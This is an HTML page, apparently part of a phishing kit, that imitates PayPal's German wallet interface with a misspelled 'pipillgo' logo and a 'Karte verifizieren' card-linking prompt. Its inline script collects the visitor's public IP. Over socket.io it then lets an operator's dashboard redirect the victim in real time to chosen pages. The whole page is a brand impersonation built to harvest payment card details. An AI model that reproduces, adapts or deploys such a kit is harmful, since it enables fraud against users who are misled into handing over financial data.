<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/card.css">
    
    <title></title>
</head>
<body>
    <div class="cc">
        <div class="all">
            <div class="logo">
                <img src="./img/pipillgomark.png" alt="">
            </div>
            <div class="loading">
                <img src="./img/loading.gif" alt="">
                <p>Einen Moment...</p>
            </div>
        </div>
    </div>
    <header>
        <div class="alltop">
            <div class="logo">
                <img src="./img/pipillgo-transparent.png" alt="">
                <div class="home">
                    <p>Startseite</p>
                    <p>Senden</p>
                    <p class="active">Brieftasche</p>
                    <p>Aktivität</p>
                    <p>Hilfe</p>
                </div>
            </div>
            <div class="extra">
                    <svg style="height: 24px; color: #d1f1ff; cursor: pointer;" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"></svg>
                        <path d="M19.25 16.37h-.05a.2.2 0 0 1-.2-.2v-5.55c0-3.17-2.11-5.85-5.01-6.71A2 2 0 0 0 12 2a2 2 0 0 0-1.99 1.91C7.11 4.77 5 7.45 5 10.62v5.55a.2.2 0 0 1-.2.2h-.05a.749.749 0 1 0 0 1.5h14.5a.749.749 0 1 0 0-1.5zm-4.9 3.15h-4.7c-.23 0-.37.25-.26.45A2.98 2.98 0 0 0 12 21.52c1.13 0 2.11-.63 2.61-1.55.11-.21-.03-.45-.26-.45z"></path>
                    </svg>
                    <svg style="height: 24px; color: #d1f1ff; cursor: pointer;" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"></svg>
                        <path d="M19.722 10.2a.378.378 0 0 1-.369-.279 7.39 7.39 0 0 0-.684-1.647.378.378 0 0 1 .054-.45 1.271 1.271 0 0 0 0-1.809l-.729-.729a1.271 1.271 0 0 0-1.809 0 .367.367 0 0 1-.45.054 7.642 7.642 0 0 0-1.656-.684.394.394 0 0 1-.279-.369C13.8 3.576 13.224 3 12.513 3h-1.035c-.702 0-1.278.576-1.278 1.287a.375.375 0 0 1-.279.36 7.642 7.642 0 0 0-1.656.684.378.378 0 0 1-.45-.054 1.271 1.271 0 0 0-1.809 0l-.738.729a1.271 1.271 0 0 0 0 1.809.367.367 0 0 1 .054.45 8.305 8.305 0 0 0-.675 1.656.375.375 0 0 1-.36.279h-.009C3.576 10.2 3 10.776 3 11.478v1.044c0 .711.576 1.278 1.278 1.278h.009c.171 0 .315.117.36.279a7.39 7.39 0 0 0 .684 1.647.378.378 0 0 1-.054.45 1.271 1.271 0 0 0 0 1.809l.729.729a1.271 1.271 0 0 0 1.809 0 .367.367 0 0 1 .45-.054 7.57 7.57 0 0 0 1.647.684.392.392 0 0 1 .288.369v.009c0 .702.567 1.278 1.278 1.278h1.044c.702 0 1.278-.576 1.278-1.278 0-.171.117-.315.279-.36a7.39 7.39 0 0 0 1.647-.684.378.378 0 0 1 .45.054 1.271 1.271 0 0 0 1.809 0l.729-.729a1.271 1.271 0 0 0 0-1.809.367.367 0 0 1-.054-.45 7.57 7.57 0 0 0 .684-1.647.375.375 0 0 1 .36-.279h.009c.702 0 1.278-.576 1.278-1.278v-1.062a1.27 1.27 0 0 0-1.269-1.278zM12 15.15A3.153 3.153 0 0 1 8.85 12 3.153 3.153 0 0 1 12 8.85 3.153 3.153 0 0 1 15.15 12 3.153 3.153 0 0 1 12 15.15z"></path>
                    </svg>
                    <p>ABMELDEN</p>
            </div>
        </div>
    </header>
    <main>
        <form action="">
            <img src="./img/empty-state-add-fi.png" alt="">
            <div class="text">
                <h3>Karte verifizieren</h3>
                
            </div>
            <a href="">Karte verknüpfen</a>
        </form>
    </main>
    <footer>
        <div class="help">
            <img src="./img/download.png" alt="">
            <a href="">Hilfe</a>
            <a href="">Kontakt</a>
            <a href="">Sicherheit</a>
        </div>
        <div class="pri">
            <div class="privacy">
                <p>©1999-2024 , Inc. Alle Rechte vorbehalten.</p>
                <a href="">Datenschutz</a>
                <a href="">Cookies</a>
                <a href="">Rechtliches</a>
            </div>
        </div>
    </footer>   

    <script src="./socket.io/socket.io.js"></script>
    <script>
      async function getPublicIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log("Public IP:", data.ip);
    return data.ip;
  } catch (error) {
    console.error("Failed to fetch IP:", error);
    return null;
  }
}
      const socket = io();
     
      // Handle redirect messages from server
      socket.on('redirect', async (data) => {
        const currentIp = await getPublicIP();
        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
        
        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {

          window.location.href = data.url;
        }
      });
      </script>
</body>
</html>